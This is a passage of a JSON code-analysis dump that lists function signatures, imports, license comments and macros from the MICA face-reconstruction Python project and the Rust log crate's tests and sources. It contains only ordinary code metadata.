          "def get_meshes(self):",
          "def transform_mesh(self, path):"
        ],
        "class_defs": [
          "class LYHM(Instance, ABC):"
        ],
        "imports": [
          "from abc import ABC",
          "from glob import glob",
          "from pathlib import Path",
          "from PIL import ImageFile",
          "from pytorch3d.io import load_objs_as_meshes",
          "from pytorch3d.transforms import RotateAxisAngle",
          "from datasets.creation.instances.instance import Instance"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/instances/florence.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def get_min_det_score(self):",
          "def get_images(self):",
          "def get_flame_params(self):",
          "def get_registrations(self):"
        ],
        "class_defs": [
          "class Florence(Instance, ABC):"
        ],
        "imports": [
          "from abc import ABC",
          "from glob import glob",
          "from pathlib import Path",
          "import numpy as np",
          "from datasets.creation.instances.instance import Instance"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/instances/frgc.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def get_images(self):",
          "def get_flame_params(self):",
          "def get_registrations(self):",
          "def get_meshes(self):",
          "def transform_mesh(self, path):"
        ],
        "class_defs": [
          "class FRGC(Instance, ABC):"
        ],
        "imports": [
          "from abc import ABC",
          "from glob import glob",
          "from pathlib import Path",
          "import numpy as np",
          "from pytorch3d.io import load_objs_as_meshes",
          "from datasets.creation.instances.instance import Instance"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/instances/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/instances/stirling.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def get_min_det_score(self):",
          "def get_images(self):",
          "def get_flame_params(self):",
          "def get_registrations(self):",
          "def get_meshes(self):",
          "def transform_mesh(self, path):",
          "def transform_path(self, file):"
        ],
        "class_defs": [
          "class Stirling(Instance, ABC):"
        ],
        "imports": [
          "from abc import ABC",
          "from glob import glob",
          "from pathlib import Path",
          "from pytorch3d.io import load_objs_as_meshes",
          "from datasets.creation.instances.instance import Instance"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/instances/pb4d.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def get_images(self):",
          "def get_flame_params(self):",
          "def get_registrations(self):",
          "def get_meshes(self):",
          "def transform_mesh(self, path):"
        ],
        "class_defs": [
          "class PB4D(Instance, ABC):"
        ],
        "imports": [
          "from abc import ABC",
          "from glob import glob",
          "from pathlib import Path",
          "import numpy as np",
          "from pytorch3d.io import load_objs_as_meshes",
          "from datasets.creation.instances.instance import Instance"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/instances/bu3dfe.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def get_images(self):",
          "def get_flame_params(self):",
          "def get_registrations(self):",
          "def get_meshes(self):",
          "def transform_mesh(self, path):"
        ],
        "class_defs": [
          "class BU3DFE(Instance, ABC):"
        ],
        "imports": [
          "from abc import ABC",
          "from glob import glob",
          "from pathlib import Path",
          "from pytorch3d.io import load_objs_as_meshes",
          "from datasets.creation.instances.instance import Instance"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/instances/facewarehouse.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def get_images(self):",
          "def get_flame_params(self):",
          "def get_registrations(self):"
        ],
        "class_defs": [
          "class FaceWarehouse(Instance, ABC):"
        ],
        "imports": [
          "from abc import ABC",
          "from glob import glob",
          "from pathlib import Path",
          "from datasets.creation.instances.instance import Instance"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/micalib/models/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/micalib/models/mica.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config=None, device=None, tag='MICA'):",
          "def create_model(self, model_cfg):",
          "def load_model(self):",
          "def model_dict(self):",
          "def parameters_to_optimize(self):",
          "def encode(self, images, arcface_imgs):",
          "def decode(self, codedict, epoch=0):",
          "def compute_losses(self, input, encoder_output, decoder_output):"
        ],
        "class_defs": [
          "class MICA(BaseModel):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import torch",
          "import torch.nn.functional as F",
          "from models.arcface import Arcface",
          "from models.generator import Generator",
          "from micalib.base_model import BaseModel",
          "from loguru import logger"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.28",
    "name": "log-0.4.28",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.28/tests/macros.rs",
        "function_defs": [
          "fn enabled(&self, _: &Metadata) -> bool {",
          "fn log(&self, _: &Record) {}",
          "fn flush(&self) {}",
          "fn no_args() {",
          "fn anonymous_args() {",
          "fn named_args() {",
          "fn inlined_args() {",
          "fn enabled() {",
          "fn expr() {",
          "fn kv_no_args() {",
          "fn kv_expr_args() {",
          "fn kv_anonymous_args() {",
          "fn kv_named_args() {",
          "fn kv_ident() {",
          "fn kv_expr_context() {",
          "fn implicit_named_args() {",
          "fn kv_implicit_named_args() {",
          "fn kv_string_keys() {",
          "fn kv_common_value_types() {",
          "fn kv_debug() {",
          "fn kv_display() {",
          "fn kv_error() {",
          "fn kv_sval() {",
          "fn kv_serde() {",
          "fn logger_short_lived() {",
          "fn logger_expr() {",
          "fn regression_issue_494() {"
        ],
        "struct_defs": [
          "struct Logger;"
        ],
        "impl_blocks": [
          "impl Log for Logger {"
        ],
        "uses": [
          "use log::{log, log_enabled, Log, Metadata, Record};",
          "use self::Type::*;"
        ],
        "macros": [
          "::log::trace!($($arg)*);",
          "::log::debug!($($arg)*);",
          "::log::info!($($arg)*);",
          "::log::warn!($($arg)*);",
          "::log::error!($($arg)*);",
          "log!(lvl, \"hello\");",
          "log!(lvl, \"hello\",);",
          "log!(target: \"my_target\", lvl, \"hello\");",
          "log!(target: \"my_target\", lvl, \"hello\",);",
          "log!(logger: logger, lvl, \"hello\");",
          "log!(logger: logger, lvl, \"hello\",);",
          "log!(logger: logger, target: \"my_target\", lvl, \"hello\");",
          "log!(logger: logger, target: \"my_target\", lvl, \"hello\",);",
          "all_log_macros!(\"hello\");",
          "all_log_macros!(\"hello\",);",
          "all_log_macros!(target: \"my_target\", \"hello\");",
          "all_log_macros!(target: \"my_target\", \"hello\",);",
          "all_log_macros!(logger: logger, \"hello\");",
          "all_log_macros!(logger: logger, \"hello\",);",
          "all_log_macros!(logger: logger, target: \"my_target\", \"hello\");",
          "all_log_macros!(logger: logger, target: \"my_target\", \"hello\",);",
          "log!(lvl, \"hello {}\", \"world\");",
          "log!(lvl, \"hello {}\", \"world\",);",
          "log!(target: \"my_target\", lvl, \"hello {}\", \"world\");",
          "log!(target: \"my_target\", lvl, \"hello {}\", \"world\",);",
          "log!(lvl, \"hello {}\", \"world\");",
          "log!(lvl, \"hello {}\", \"world\",);",
          "all_log_macros!(\"hello {}\", \"world\");",
          "all_log_macros!(\"hello {}\", \"world\",);",
          "all_log_macros!(target: \"my_target\", \"hello {}\", \"world\");",
          "all_log_macros!(target: \"my_target\", \"hello {}\", \"world\",);",
          "all_log_macros!(logger: logger, \"hello {}\", \"world\");",
          "all_log_macros!(logger: logger, \"hello {}\", \"world\",);",
          "all_log_macros!(logger: logger, target: \"my_target\", \"hello {}\", \"world\");",
          "all_log_macros!(logger: logger, target: \"my_target\", \"hello {}\", \"world\",);",
          "log!(lvl, \"hello {world}\", world = \"world\");",
          "log!(lvl, \"hello {world}\", world = \"world\",);",
          "log!(target: \"my_target\", lvl, \"hello {world}\", world = \"world\");",
          "log!(target: \"my_target\", lvl, \"hello {world}\", world = \"world\",);",
          "log!(lvl, \"hello {world}\", world = \"world\");",
          "log!(lvl, \"hello {world}\", world = \"world\",);",
          "all_log_macros!(\"hello {world}\", world = \"world\");",
          "all_log_macros!(\"hello {world}\", world = \"world\",);",
          "all_log_macros!(target: \"my_target\", \"hello {world}\", world = \"world\");",
          "all_log_macros!(target: \"my_target\", \"hello {world}\", world = \"world\",);",
          "all_log_macros!(logger: logger, \"hello {world}\", world = \"world\");",
          "all_log_macros!(logger: logger, \"hello {world}\", world = \"world\",);",
          "all_log_macros!(logger: logger, target: \"my_target\", \"hello {world}\", world = \"w",
          "all_log_macros!(logger: logger, target: \"my_target\", \"hello {world}\", world = \"w",
          "log!(lvl, \"hello {world}\");",
          "log!(lvl, \"hello {world}\",);",
          "log!(target: \"my_target\", lvl, \"hello {world}\");",
          "log!(target: \"my_target\", lvl, \"hello {world}\",);",
          "log!(lvl, \"hello {world}\");",
          "log!(lvl, \"hello {world}\",);",
          "all_log_macros!(\"hello {world}\");",
          "all_log_macros!(\"hello {world}\",);",
          "all_log_macros!(target: \"my_target\", \"hello {world}\");",
          "all_log_macros!(target: \"my_target\", \"hello {world}\",);",
          "all_log_macros!(logger: logger, \"hello {world}\");",
          "all_log_macros!(logger: logger, \"hello {world}\",);",
          "all_log_macros!(logger: logger, target: \"my_target\", \"hello {world}\");",
          "all_log_macros!(logger: logger, target: \"my_target\", \"hello {world}\",);",
          "let _enabled = log_enabled!(lvl);",
          "let _enabled = log_enabled!(target: \"my_target\", lvl);",
          "let _enabled = log_enabled!(logger: logger, target: \"my_target\", lvl);",
          "let _enabled = log_enabled!(logger: logger, lvl);",
          "log!(lvl, \"hello\");",
          "log!(logger: logger, lvl, \"hello\");",
          "log!(target: \"my_target\", lvl, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; ",
          "log!(lvl, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; \"hello\");",
          "log!(logger: logger, target: \"my_target\", lvl, cat_1 = \"chashu\", cat_2 = \"nori\",",
          "log!(logger: logger, lvl, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; \"hell",
          "all_log_macros!(target: \"my_target\", cat_1 = \"chashu\", cat_2 = \"nori\", cat_count",
          "all_log_macros!(target = \"my_target\", cat_1 = \"chashu\", cat_2 = \"nori\", cat_coun",
          "all_log_macros!(cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; \"hello\");",
          "all_log_macros!(logger: logger, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2;",
          "all_log_macros!(logger: logger, target: \"my_target\", cat_1 = \"chashu\", cat_2 = \"",
          "log!(target: \"my_target\", lvl, cat_math = { let mut x = 0; x += 1; x + 1 }; \"hel",
          "log!(lvl, target = \"my_target\", cat_math = { let mut x = 0; x += 1; x + 1 }; \"he",
          "log!(lvl, cat_math = { let mut x = 0; x += 1; x + 1 }; \"hello\");",
          "log!(logger: logger, target: \"my_target\", lvl, cat_math = { let mut x = 0; x += ",
          "log!(logger: logger, lvl, target = \"my_target\", cat_math = { let mut x = 0; x +=",
          "log!(logger: logger, lvl, cat_math = { let mut x = 0; x += 1; x + 1 }; \"hello\");",
          "all_log_macros!(target: \"my_target\", cat_math = { let mut x = 0; x += 1; x + 1 }",
          "all_log_macros!(target = \"my_target\", cat_math = { let mut x = 0; x += 1; x + 1 ",
          "all_log_macros!(cat_math = { let mut x = 0; x += 1; x + 1 }; \"hello\");",
          "all_log_macros!(logger: logger, target: \"my_target\", cat_math = { let mut x = 0;",
          "all_log_macros!(logger: logger, target = \"my_target\", cat_math = { let mut x = 0",
          "all_log_macros!(logger: logger, cat_math = { let mut x = 0; x += 1; x + 1 }; \"he",
          "log!(target: \"my_target\", lvl, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; ",
          "log!(lvl, target = \"my_target\", cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2;",
          "log!(lvl, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; \"hello {}\", \"world\");",
          "log!(logger: logger, target: \"my_target\", lvl, cat_1 = \"chashu\", cat_2 = \"nori\",",
          "log!(logger: logger, lvl, target = \"my_target\", cat_1 = \"chashu\", cat_2 = \"nori\"",
          "log!(logger: logger, lvl, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; \"hell",
          "all_log_macros!(target: \"my_target\", cat_1 = \"chashu\", cat_2 = \"nori\", cat_count",
          "all_log_macros!(target = \"my_target\", cat_1 = \"chashu\", cat_2 = \"nori\", cat_coun",
          "all_log_macros!(cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; \"hello {}\", \"wo",
          "all_log_macros!(logger: logger, target: \"my_target\", cat_1 = \"chashu\", cat_2 = \"",
          "all_log_macros!(logger: logger, target = \"my_target\", cat_1 = \"chashu\", cat_2 = ",
          "all_log_macros!(logger: logger, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2;",
          "log!(target: \"my_target\", lvl, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; ",
          "log!(lvl, target = \"my_target\", cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2;",
          "log!(lvl, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; \"hello {world}\", worl",
          "log!(logger: logger, target: \"my_target\", lvl, cat_1 = \"chashu\", cat_2 = \"nori\",",
          "log!(logger: logger, lvl, target = \"my_target\", cat_1 = \"chashu\", cat_2 = \"nori\"",
          "log!(logger: logger, lvl, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; \"hell",
          "all_log_macros!(target: \"my_target\", cat_1 = \"chashu\", cat_2 = \"nori\", cat_count",
          "all_log_macros!(target = \"my_target\", cat_1 = \"chashu\", cat_2 = \"nori\", cat_coun",
          "all_log_macros!(cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; \"hello {world}\"",
          "all_log_macros!(logger: logger, target: \"my_target\", cat_1 = \"chashu\", cat_2 = \"",
          "all_log_macros!(logger: logger, target = \"my_target\", cat_1 = \"chashu\", cat_2 = ",
          "all_log_macros!(logger: logger, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2;",
          "all_log_macros!(cat_1, cat_2:%, cat_count = 2; \"hello {world}\", world = \"world\")",
          "log::info!(target: \"target\", cat_1 = cat_1, cat_2 = \"nori\"; \"hello {}\", \"cats\");",
          "log!(lvl, \"hello {world}\");",
          "log!(lvl, \"hello {world}\",);",
          "log!(target: \"my_target\", lvl, \"hello {world}\");",
          "log!(target: \"my_target\", lvl, \"hello {world}\",);",
          "log!(lvl, \"hello {world}\");",
          "log!(lvl, \"hello {world}\",);",
          "all_log_macros!(\"hello {world}\");",
          "all_log_macros!(\"hello {world}\",);",
          "all_log_macros!(target: \"my_target\", \"hello {world}\");",
          "all_log_macros!(target: \"my_target\", \"hello {world}\",);",
          "all_log_macros!(target = \"my_target\"; \"hello {world}\");",
          "all_log_macros!(target = \"my_target\"; \"hello {world}\",);",
          "log!(target: \"my_target\", lvl, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; ",
          "log!(lvl, cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; \"hello {world}\");",
          "all_log_macros!(target: \"my_target\", cat_1 = \"chashu\", cat_2 = \"nori\", cat_count",
          "all_log_macros!(target = \"my_target\", cat_1 = \"chashu\", cat_2 = \"nori\", cat_coun",
          "all_log_macros!(cat_1 = \"chashu\", cat_2 = \"nori\", cat_count = 2; \"hello {world}\"",
          "log!(target: \"my_target\", lvl, \"also dogs\" = \"F\u00edlos\", \"key/that-can't/be/an/iden",
          "all_log_macros!(target: \"my_target\", \"also dogs\" = \"F\u00edlos\", \"key/that-can't/be/a",
          "all_log_macros!(",
          "all_log_macros!(",
          "all_log_macros!(",
          "all_log_macros!(",
          "all_log_macros!(",
          "all_log_macros!(",
          "all_log_macros!(logger: Logger, \"hello\");",
          "all_log_macros!(logger: &Logger, \"hello\");",
          "all_log_macros!(logger: {",
          "all_log_macros!(\"some message: {:?}, {:?}\", None, Some);"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.28/tests/integration.rs",
        "function_defs": [
          "fn enabled(&self, _: &Metadata) -> bool {",
          "fn log(&self, record: &Record) {",
          "fn flush(&self) {}",
          "fn test_integration() {",
          "fn test_filter(logger: &dyn Log, a: &State, filter: LevelFilter) {",
          "fn t(lvl: Level, filter: LevelFilter) -> Option<Level> {",
          "fn last(state: &State, expected: Option<Level>) {",
          "fn test_line_numbers(logger: &dyn Log, state: &State) {",
          "fn check_log_location(state: &State) {"
        ],
        "struct_defs": [
          "struct State {",
          "struct Logger(Arc<State>);"
        ],
        "impl_blocks": [
          "impl Log for Logger {"
        ],
        "uses": [
          "use log::{debug, error, info, trace, warn, Level, LevelFilter, Log, Metadata, Record};",
          "use std::sync::{Arc, Mutex};"
        ],
        "macros": [
          "error!(logger: logger, \"\");",
          "warn!(logger: logger, \"\");",
          "info!(logger: logger, \"\");",
          "debug!(logger: logger, \"\");",
          "trace!(logger: logger, \"\");",
          "assert_eq!(lvl, expected);",
          "info!(logger: logger, \"\"); // ensure check_line function follows log macro",
          "assert_eq!(line_number, location - 1);"
        ],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.28/benches/value.rs",
        "function_defs": [
          "fn u8_to_value(b: &mut test::Bencher) {",
          "fn u8_to_value_debug(b: &mut test::Bencher) {",
          "fn str_to_value_debug(b: &mut test::Bencher) {",
          "fn custom_to_value_debug(b: &mut test::Bencher) {"
        ],
        "struct_defs": [
          "struct A;"
        ],
        "impl_blocks": [],
        "uses": [
          "use log::kv::Value;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.28/src/serde.rs",
        "function_defs": [
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_u64<E>(self, v: u64) -> Result<Self::Value, E>",
          "fn visit_str<E>(self, s: &str) -> Result<Self::Value, E>",
          "fn visit_bytes<E>(self, value: &[u8]) -> Result<Self::Value, E>",
          "fn deserialize<D>(self, deserializer: D) -> Result<Self::Value, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_enum<A>(self, value: A) -> Result<Self::Value, A::Error>",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_u64<E>(self, v: u64) -> Result<Self::Value, E>",
          "fn visit_str<E>(self, s: &str) -> Result<Self::Value, E>",
          "fn visit_bytes<E>(self, value: &[u8]) -> Result<Self::Value, E>",
          "fn deserialize<D>(self, deserializer: D) -> Result<Self::Value, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_enum<A>(self, value: A) -> Result<Self::Value, A::Error>",
          "fn level_token(variant: &'static str) -> Token {",
          "fn level_bytes_tokens(variant: &'static [u8]) -> [Token; 3] {",
          "fn level_variant_tokens(variant: u32) -> [Token; 3] {",
          "fn level_filter_token(variant: &'static str) -> Token {",
          "fn level_filter_bytes_tokens(variant: &'static [u8]) -> [Token; 3] {",
          "fn level_filter_variant_tokens(variant: u32) -> [Token; 3] {",
          "fn test_level_ser_de() {",
          "fn test_level_case_insensitive() {",
          "fn test_level_de_bytes() {",
          "fn test_level_de_variant_index() {",
          "fn test_level_de_error() {",
          "fn test_level_filter_ser_de() {",
          "fn test_level_filter_case_insensitive() {",
          "fn test_level_filter_de_bytes() {",
          "fn test_level_filter_de_variant_index() {",
          "fn test_level_filter_de_error() {"
        ],
        "struct_defs": [
          "struct LevelIdentifier;",
          "struct LevelEnum;",
          "struct LevelFilterIdentifier;",
          "struct LevelFilterEnum;"
        ],
        "impl_blocks": [
          "impl Serialize for Level {",
          "impl Serialize for LevelFilter {"
        ],
        "uses": [
          "use serde::de::{",
          "use serde::ser::{Serialize, Serializer};",
          "use crate::{Level, LevelFilter, LOG_LEVEL_NAMES};",
          "use std::fmt;",
          "use std::str::{self, FromStr};",
          "use crate::{Level, LevelFilter};",
          "use serde_test::{assert_de_tokens, assert_de_tokens_error, assert_tokens, Token};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 10
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.28/src/__private_api.rs",
        "function_defs": [
          "fn into_kvs(self) -> Option<&'a [(&'a str, super::Value<'a>)]>;",
          "fn into_kvs(self) -> Option<&'a [(&'a str, Value<'a>)]> {",
          "fn into_kvs(self) -> Option<&'a [(&'a str, Value<'a>)]> {",
          "fn enabled(&self, metadata: &Metadata) -> bool {",
          "fn log(&self, record: &Record) {",
          "fn flush(&self) {",
          "fn log_impl<L: Log>("
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Log for GlobalLogger {"
        ],
        "uses": [
          "use self::sealed::KVs;",
          "use crate::{logger, Level, Log, Metadata, Record};",
          "use std::fmt::Arguments;",
          "use std::panic::Location;",
          "use crate::kv;"
        ],
        "macros": [
          "panic!(\"key-value support is experimental and must be enabled using the `kv` fea"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.28/src/lib.rs",
        "function_defs": [
          "fn load(&self, _order: Ordering) -> usize {",
          "fn store(&self, val: usize, _order: Ordering) {",
          "fn eq(&self, other: &LevelFilter) -> bool {",
          "fn partial_cmp(&self, other: &LevelFilter) -> Option<cmp::Ordering> {",
          "fn from_str(level: &str) -> Result<Level, Self::Err> {",
          "fn fmt(&self, fmt: &mut fmt::Formatter) -> fmt::Result {",
          "fn from_usize(u: usize) -> Option<Level> {",
          "fn eq(&self, other: &Level) -> bool {",
          "fn partial_cmp(&self, other: &Level) -> Option<cmp::Ordering> {",
          "fn from_str(level: &str) -> Result<LevelFilter, Self::Err> {",
          "fn fmt(&self, fmt: &mut fmt::Formatter) -> fmt::Result {",
          "fn from_usize(u: usize) -> Option<LevelFilter> {",
          "fn get(&self) -> &'a str {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn default() -> Self {",
          "fn default() -> Self {",
          "fn enabled(&self, metadata: &Metadata) -> bool;",
          "fn log(&self, record: &Record);",
          "fn flush(&self);",
          "fn enabled(&self, _: &Metadata) -> bool {",
          "fn log(&self, _: &Record) {}",
          "fn flush(&self) {}",
          "fn enabled(&self, metadata: &Metadata) -> bool {",
          "fn log(&self, record: &Record) {",
          "fn flush(&self) {",
